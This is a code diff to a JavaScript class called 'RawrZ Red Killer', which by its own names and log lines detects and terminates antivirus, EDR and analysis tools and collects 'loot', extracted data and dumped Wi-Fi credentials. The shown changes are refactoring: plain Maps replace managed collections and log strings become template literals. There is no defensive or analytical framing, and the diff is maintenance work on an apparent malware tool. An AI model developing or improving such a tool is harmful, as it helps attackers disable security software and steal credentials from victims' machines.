@@ -5,6 +5,7 @@ const crypto = require('crypto');
 const os = require('os');
 const https = require('https');
 const tls = require('tls');
+const memoryManager = require('./memory-manager');
 
 class RedKiller {
     // Performance monitoring
@@ -24,10 +25,10 @@ class RedKiller {
         this.name = 'RawrZ Red Killer';
         this.version = '1.0.30';
         this.initialized = false;
-        this.activeKills = this.memoryManager.createManagedCollection('activeKills', 'Map', 100);
-        this.extractedData = this.memoryManager.createManagedCollection('extractedData', 'Map', 100);
-        this.lootContainer = this.memoryManager.createManagedCollection('lootContainer', 'Map', 100);
-        this.wifiCredentials = this.memoryManager.createManagedCollection('wifiCredentials', 'Map', 100);
+        this.activeKills = new Map();
+        this.extractedData = new Map();
+        this.lootContainer = new Map();
+        this.wifiCredentials = new Map();
         
         // AV/EDR Detection Patterns
         this.avPatterns = {
@@ -217,7 +218,7 @@ class RedKiller {
 
     async initialize() {
         try {
-            console.log("[Red Killer] Initializing ${this.name} v" + this.version + "...");
+            console.log(`[Red Killer] Initializing ${this.name} v${this.version}...`);
             
             // Initialize detection capabilities
             await this.initializeDetection();
@@ -235,7 +236,7 @@ class RedKiller {
             await this.initializeWiFiDumper();
             
             this.initialized = true;
-            console.log("[Red Killer] ${this.name} v" + this.version + " initialized successfully");
+            console.log(`[Red Killer] ${this.name} v${this.version} initialized successfully`);
             return true;
         } catch (error) {
             console.error(`[Red Killer] Initialization failed:`, error);
@@ -342,7 +343,7 @@ class RedKiller {
                 }
             }
 
-            console.log("[Red Killer] Detection complete: ${detected.antivirus.length} AV, ${detected.edr.length} EDR, ${detected.systemSecurity.length} System Security, ${detected.malwareRemoval.length} Malware Removal, " + detected.analysisTools.length + " Analysis Tools");
+            console.log(`[Red Killer] Detection complete: ${detected.antivirus.length} AV, ${detected.edr.length} EDR, ${detected.systemSecurity.length} System Security, ${detected.malwareRemoval.length} Malware Removal, ${detected.analysisTools.length} Analysis Tools`);
             return detected;
 
         } catch (error) {
@@ -480,7 +481,7 @@ class RedKiller {
                 }
             }
 
-            console.log("[Red Killer] Termination complete: ${results.totalSuccessful}/" + results.totalAttempted + " successful");
+            console.log(`[Red Killer] Termination complete: ${results.totalSuccessful}/${results.totalAttempted} successful`);
             return results;
 
         } catch (error) {
